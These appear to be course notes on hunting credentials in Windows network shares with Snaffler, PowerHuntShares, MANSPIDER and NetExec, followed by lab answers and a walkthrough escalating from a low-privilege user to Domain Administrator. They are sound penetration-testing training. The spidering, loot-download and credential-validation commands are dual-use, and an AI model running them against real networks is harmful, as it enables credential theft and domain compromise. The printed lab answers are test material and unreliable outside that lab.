# Credential Hunting in Network Shares

> **Module Section:** 19 / 26 — Password Attacks

## Overview

Almost every company uses network shares. Employees store files on them and access them from any computer on the network. This is convenient — but dangerous. Config files, scripts, and install files often contain plaintext passwords. Attackers hunt these shares after gaining initial access.

This section shows how to find credentials in network shares from both **Windows** and **Linux** systems.

---

## Common Credential Patterns

Before using specialized tools, understand the **patterns and file formats** that often reveal sensitive information.

### Keywords to Search For

| Type | Examples |
|------|----------|
| **Credential keywords** | `passw`, `user`, `token`, `key`, `secret` |
| **File extensions** | `.ini`, `.cfg`, `.env`, `.xlsx`, `.ps1`, `.bat` |
| **Interesting filenames** | `config`, `user`, `passw`, `cred`, `initial` |
| **Domain-specific** | `INLANEFREIGHT\` (locate creds within a domain) |

### Strategic Tips

- **Localize keywords** — Attacking a German company? Search for `Benutzer` instead of `User`
- **Be strategic with shares** — Scanning 10 shares with thousands of files takes significant time
- **Prioritize IT shares** over company photos or marketing shares
- **Start simple** — Begin with command-line searches before scaling to automated tools

### Quick PowerShell Search

```powershell
Get-ChildItem -Recurse -Include *.ext \\Server\Share | Select-String -Pattern "passw"
```
> Searches all files on a UNC share that match the extension for the string "passw". Swap `*.ext` for `*.ps1,*.txt,*.ini` and change the pattern to match your target keyword.

---

## Hunting from Windows

### Snaffler

Snaffler is a C# program. Run it on a domain-joined machine and it auto-discovers accessible network shares, then searches them for interesting files. It color-codes results so you can spot credentials at a glance.

#### Basic Usage

```cmd
c:\Users\Public>Snaffler.exe -s
```
> Runs Snaffler on the current domain-joined machine. It finds accessible shares, downloads interesting files, and color-codes results. Add `-o snaffler.log` to save output to a file.

#### Example Output Highlights

```
[Share] {Green}<\\DC01.inlanefreight.local\ADMIN$>(R) Remote Admin
[Share] {Green}<\\DC01.inlanefreight.local\IT>(R)
[Share] {Green}<\\DC01.inlanefreight.local\HR>(R)

[File] {Red}<KeepPassOrKeyInCode|R|passw?o?r?d?>\s*[^\s<]+\s*<|2.3kB>
       (\\DC01.inlanefreight.local\ADMIN$\Panther\unattend.xml)
       <AdministratorPassword>*SENSITIVE*DATA*DELETED*</AdministratorPassword>
```

#### Color Coding

| Color | Meaning |
|-------|---------|
| Green | Accessible share (R = Read) |
| Red | High-value finding (e.g., passwords) |
| Yellow | Medium-interest file (e.g., disk images) |
| Black | No access |

#### Useful Parameters

| Flag | Purpose |
|------|---------|
| `-s` | Basic share discovery and file scan |
| `-u` | Retrieve users from AD and search for references to them in files |
| `-i` | **Include** specific shares in the search |
| `-n` | Exclude specific shares |

> Manual review is always required. All these tools produce large output with many false positives.

---

### PowerHuntShares

PowerHuntShares is a PowerShell script. It does not need a domain-joined machine. Its best feature is the HTML report it generates — easy to browse and share with a team.

#### Report Example

The summary categorizes findings as Critical, High, Medium, or Low. It also groups files into **Interesting**, **Sensitive**, and **Secrets** categories.

#### Basic Usage

```powershell
PS C:\Users\Public\PowerHuntShares> Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public
```
> Runs PowerHuntShares with 100 parallel threads and saves the HTML and CSV report to the specified folder. Increase `-Threads` on fast networks; lower it on slow ones.

#### What It Automates

- Determines the current computer's domain
- Enumerates domain computers
- Checks ping responses
- Filters for TCP 445 open and accessible
- Enumerates SMB shares and permissions
- Identifies shares with excessive privileges
- Identifies high-risk shares
- Enumerates share owners, names, and directory listings
- Generates last-written and last-accessed timelines
- Produces HTML summary and detailed CSV files

> Can take hours to run in large environments.

---

## Hunting from Linux

### MANSPIDER

MANSPIDER scans SMB shares remotely from Linux. You do not need a domain-joined computer. Run it via the official Docker container to avoid dependency problems.

#### Basic Content Search

```bash
docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider \
  10.129.234.121 -c 'passw' -u 'mendres' -p 'Inlanefreight2025!'
```
> Runs MANSPIDER via Docker against the target host. `-c` sets the content pattern to search for. `-u` and `-p` provide credentials. Matching files are downloaded to the loot directory mounted at `/root/.manspider`.

#### Key Output

```
[+] Skipping files larger than 10.00MB
[+] Using 5 threads
[+] Searching by file content: "passw"
[+] Matching files will be downloaded to /root/.manspider/loot
[+] 10.129.234.121: Successful login as "mendres"
```

#### Key Options

| Flag | Purpose |
|------|---------|
| `-c` | Content pattern to search for |
| `-u` | Username |
| `-p` | Password |
| `-v` | Volume mount for loot storage |

> Matching files are downloaded automatically to the loot directory for offline review.

---

### NetExec (`nxc`)

NetExec has many uses. One of them is spidering network shares with the `--spider` option. It is fast and integrates well into existing Active Directory workflows.

#### Basic Usage

```bash
nxc smb 10.129.234.121 -u mendres -p 'Inlanefreight2025!' \
    --spider IT --content --pattern "passw"
```
> Spiders the IT share on the target, scanning file contents for the pattern "passw". `--content` enables content search (not just filenames). Change `--pattern` to any keyword you want.

#### Example Output

```
SMB  10.129.234.121  445  DC01  [*] Windows 10 / Server 2019 Build 17763 x64
SMB  10.129.234.121  445  DC01  [+] inlanefreight.local\mendres:Inlanefreight2025!
SMB  10.129.234.121  445  DC01  [*] Started spidering
SMB  10.129.234.121  445  DC01  [*] Spidering .
```

#### Key Options

| Flag | Purpose |
|------|---------|
| `--spider <share>` | Specify share to spider |
| `--content` | Search file contents (not just names) |
| `--pattern <str>` | Pattern to search for |

---

## Tool Comparison

| Tool | Platform | Domain-Joined? | Output Format | Best For |
|------|----------|----------------|---------------|----------|
| **Snaffler** | Windows | ✅ Required | Console (colored) | Thorough scans with classification rules |
| **PowerHuntShares** | Windows | ❌ Not required | HTML + CSV | Management-friendly reports |
| **MANSPIDER** | Linux | ❌ Not required | Downloaded loot | Remote credential hunting |
| **NetExec** | Linux | ❌ Not required | Console | Quick pattern-based searches |

---

## Common High-Value Finds

| File | Why It Matters |
|------|----------------|
| `unattend.xml` | Contains `AdministratorPassword` (sometimes Base64-encoded) |
| `sysprep.inf` / `sysprep.xml` | Autoinstall configs with creds |
| `web.config` | Connection strings, credentials |
| `.ps1` / `.bat` scripts | Hardcoded credentials |
| `*.kdbx` | KeePass databases |
| `Groups.xml` (SYSVOL) | GPP passwords (cpassword) |
| `.env` / `.ini` / `.cfg` | Application config + secrets |

---

## Key Takeaways

1. **Network shares are credential goldmines** — left-behind configs, scripts, and unattend files contain plaintext secrets
2. **Start simple** with command-line searches before launching automated tools
3. **Be strategic about shares** — target IT/admin shares first
4. **Localize keywords** to the target's language
5. **Manual review is essential** — all tools produce false positives
6. **Snaffler** = best on-system Windows tool; **PowerHuntShares** = best report UI
7. **MANSPIDER** = best for remote Linux-based hunting with auto-download of loot
8. **NetExec** = fast, pattern-based, integrates with existing AD workflows
9. Always check **ADMIN$** and **C$** shares for `Panther\unattend.xml` and SYSVOL for GPP files

---

## Exercise

> Use credentials `mendres:Inlanefreight2025!` to connect via RDP or WinRM. Snaffler and PowerHuntShares are pre-loaded in `C:\Users\Public`.

### Exercise Answers

**Q1 — Credential mendres has access to (another domain user):**
`jbader : ILovePower333###`
Located in `\\DC01\IT\Tools\split_tunnel.txt`.

**Q2 — Domain Administrator password (as jbader):**
`Administrator : Str0ng_Adm1nistrat0r_P@ssword_2025!`
Located in `\\DC01\HR\Confidential\Onboarding_Docs_132.txt` — Josh Bader's onboarding doc literally documents the Administrator password granted to him for a 90-day DC migration project.

---

## 🎯 Walkthrough — Credential Chain on `inlanefreight.local`

A worked example of pivoting from a low-priv user → domain user → Domain Administrator using only SMB share spidering.

### Lab Notes & Heuristics

This lab uses **decoy generators** (`IT\Admin\*.ps1`) that plant fake credentials throughout shares to defeat naive `grep passw` workflows. Real findings have these characteristics:

| Characteristic | Decoy / Bait | Real Credential |
|---|---|---|
| **File size** | Uniform 113 B (filler) or 167–182 B (bait) | Outlier size (~200–2500 B) |
| **Format** | `username=corpUser1\npassword=...` inline | Trailing `NOTE:` or `# Auth backup:` block |
| **Examples (FAKE)** | `corpUser1:Summer2023!`, `hr_backup:HRrocks2025!`, `policy_mgr:SecureDocs99`, `doceditor:Draft456!`, `ad_mgr:Brand2025!` | (See answers above) |
| **Generators** | `IT\Admin\Company.ps1`, `HR.ps1`, `Marketing.ps1`, etc. — read these to ID all bait | n/a |

> 💡 **Always ignore `IT\Tools\nishang-master\` and `PowerSploit-master\`** — those are dropped tooling and produce thousands of `passw` matches.

### Step 1 — Verify access and enumerate shares as the starting user

```bash
nxc smb 10.129.234.173 -u mendres -p 'Inlanefreight2025!' --shares
```
> Lists all SMB shares on the target and shows what permissions the user has on each one. Look for READ access to non-default shares like IT, HR, and Company.

`mendres` has READ on: Company, HR, IT, NETLOGON, SYSVOL.

### Step 2 — Spider readable shares for `passw`

```bash
for s in HR IT Company; do
  echo "=========== $s ==========="
  nxc smb 10.129.234.173 -u mendres -p 'Inlanefreight2025!' \
      --spider "$s" --content --pattern "passw"
done
```
> Loops through three shares and spiders each one for files containing "passw". Running them in a loop saves time versus three separate commands.

Filter the noise: ignore `IT\Tools\nishang-master\*`, `PowerSploit-master\*`, and uniform-size decoys. The real hit is the size outlier:

```
//10.129.234.173/IT/Tools/split_tunnel.txt  size:224  pattern:'passw'
```

### Step 3 — Download and inspect the candidate file

```bash
smbclient //10.129.234.173/IT -U 'inlanefreight.local\mendres%Inlanefreight2025!' \
  -c 'cd Tools; get split_tunnel.txt'
cat 'Tools\split_tunnel.txt'
```
> Connects to the IT share with smbclient and downloads the target file. The `-c` flag passes commands directly without an interactive session. Note: smbclient saves files with literal backslashes in the name on Linux, so quote the path when reading it.

```
Old settings for legacy VPN deployment:
- Use split tunneling where possible
- DNS resolution priority = local > remote

# Auth backup password: INLANEFREIGHT\jbader:ILovePower333###

- Ports used: 443, 8443, 1194
```

✅ **Pivot credential found: `jbader:ILovePower333###`**

### Step 4 — Validate and re-enumerate shares as the new user

```bash
nxc smb 10.129.234.173 -u jbader -p 'ILovePower333###'           # confirms valid
nxc smb 10.129.234.173 -u jbader -p 'ILovePower333###' --shares
```
> First command confirms the credential works (look for a green "+" in the output). Second command re-enumerates shares with the new user to find what additional access they have.

`jbader` has **READ,WRITE** on Company, Finance, **HR**, IT, **Marketing**, **Sales** — note the newly accessible shares; that's where the next secret lives.

### Step 5 — Spider all newly accessible shares

```bash
for s in HR IT Finance Marketing Sales Company; do
  echo "=========== $s ==========="
  nxc smb 10.129.234.173 -u jbader -p 'ILovePower333###' \
      --spider "$s" --content --pattern "passw"
done
```
> Same spider loop as Step 2, now using jbader's credentials. This reaches newly accessible shares like Finance, Marketing, Sales, and HR\Confidential that were denied to mendres.

Two high-value hits stand out (not in `Tools\` and not uniform-size decoys):

- `HR/Confidential/Onboarding_Docs_132.txt`  ← previously **denied to mendres**
- `IT/Admin/*.ps1`  ← these are the **decoy generator scripts** themselves (worth reading to understand the bait)

### Step 6 — Bulk-download admin scripts + the HR confidential doc

```bash
mkdir -p ~/manspider/loot/q2 && cd ~/manspider/loot/q2

smbclient //10.129.234.173/IT -U 'inlanefreight.local\jbader%ILovePower333###' \
  -c 'prompt OFF; recurse ON; cd Admin; mget *'

smbclient //10.129.234.173/HR -U 'inlanefreight.local\jbader%ILovePower333###' \
  -c 'prompt OFF; cd Confidential; get Onboarding_Docs_132.txt'

cat Onboarding_Docs_132.txt
```
> First smbclient command bulk-downloads all files from IT\Admin using `recurse ON` and `mget *`. Second command downloads the specific HR file. `prompt OFF` suppresses the per-file confirmation prompt.

The onboarding doc reveals the answer:

```
Notes:
Jordan will be responsible for ... Temporarily granted access to the
domain administrator account for initial 90 days ...

Account credentials
**Username:** `Administrator`
**Password:** `Str0ng_Adm1nistrat0r_P@ssword_2025!`
```

✅ **Domain Admin credential found: `Administrator:Str0ng_Adm1nistrat0r_P@ssword_2025!`**

### Step 7 — Verify Domain Admin

```bash
nxc smb 10.129.234.173 -u Administrator -p 'Str0ng_Adm1nistrat0r_P@ssword_2025!'
# Expect (Pwn3d!) marker — full domain compromise
```
> Validates the Domain Administrator credential. A `(Pwn3d!)` marker in the output confirms local admin access, which on a DC means full domain compromise.

### Lessons Learned

1. **NetExec `--spider --content --pattern`** beats Snaffler and PowerHuntShares on this lab. PowerHuntShares only matches filenames. Snaffler drowns in nishang and PowerSploit noise.
2. **Look for size outliers**, not just keyword hits. A "passw" match in a 113-byte filler file is a decoy. A match in a 224-byte file in an otherwise uniform share is real.
3. **Real credentials appear in trailing comment blocks** like `NOTE:` or `# Auth backup:`. Inline `username=/password=` pairs are usually bait.
4. **Re-enumerate shares after every credential pivot.** Newly accessible shares are where the next secret lives.
5. **Read the decoy generator scripts** (`IT\Admin\*.ps1`) once you have access. They list every fake credential planted in the lab.
6. **Files with `.docx` or `.pdf` extensions may actually be plaintext.** Always `cat` them first before trying to unzip.
7. **smbclient saves files with literal backslashes in filenames on Linux.** Quote the path when reading: `cat 'Tools\split_tunnel.txt'`.

---

## References

- [Snaffler GitHub](https://github.com/SnaffCon/Snaffler)
- [PowerHuntShares GitHub](https://github.com/NetSPI/PowerHuntShares)
- [MANSPIDER GitHub](https://github.com/blacklanternsecurity/MANSPIDER)
- [NetExec Wiki — Spider Module](https://www.netexec.wiki/smb-protocol/spidering-shares)
